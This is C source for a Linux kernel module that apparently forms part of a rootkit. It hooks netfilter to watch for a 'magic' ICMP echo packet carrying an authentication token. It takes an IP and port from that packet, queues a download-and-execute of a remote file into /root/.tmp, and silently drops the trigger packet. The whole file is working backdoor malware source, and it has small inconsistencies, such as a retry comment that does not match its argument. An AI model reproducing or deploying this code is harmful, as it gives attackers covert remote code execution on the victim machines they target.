#include "common.h"
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

struct magic_icmp {
    unsigned int magic;
    unsigned int ip;
    unsigned short port;
};

struct nf_hook_ops pre_hook;

unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    struct magic_icmp *payload;
    #if defined(_CONFIG_DLEXEC_)
    unsigned int payload_size, ip = 0;
    unsigned short port = 0;
    #endif

    ip_header = ip_hdr(skb);
    if ( ! ip_header )
        return NF_ACCEPT;

    if ( ip_header->protocol != IPPROTO_ICMP )
        return NF_ACCEPT;

    // skb->transport_header hasn't been set by this point, so we have to calculate it manually
    icmp_header = (struct icmphdr *)(ip_header + 1);
    if ( ! icmp_header )
        return NF_ACCEPT;

    payload = (struct magic_icmp *)(icmp_header + 1);
    payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);

    #if __DEBUG__
    printk("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
    #endif

    if ( icmp_header->type != ICMP_ECHO || payload_size != 10 || payload->magic != AUTH_TOKEN )
        return NF_ACCEPT;

    #if __DEBUG__
    printk("Received magic ICMP packet\n");
    #endif

    #if defined(_CONFIG_DLEXEC_)
    ip = payload->ip;
    port = payload->port;

    // 3 attempts, 2000ms delay
    dlexec_queue("/root/.tmp", ip, port, 2, 2000);
    #endif

    return NF_STOLEN;
}

void icmp_init ( void )
{
    #if __DEBUG__
    printk("Monitoring ICMP packets via netfilter\n");
    #endif

    pre_hook.hook     = watch_icmp;
    pre_hook.pf       = PF_INET;
    pre_hook.priority = NF_IP_PRI_FIRST;
    pre_hook.hooknum  = NF_INET_PRE_ROUTING;

    nf_register_hook(&pre_hook);
}

void icmp_exit ( void )
{
    #if __DEBUG__
    printk("Monitoring ICMP packets via netfilter\n");
    #endif

    nf_unregister_hook(&pre_hook);
}
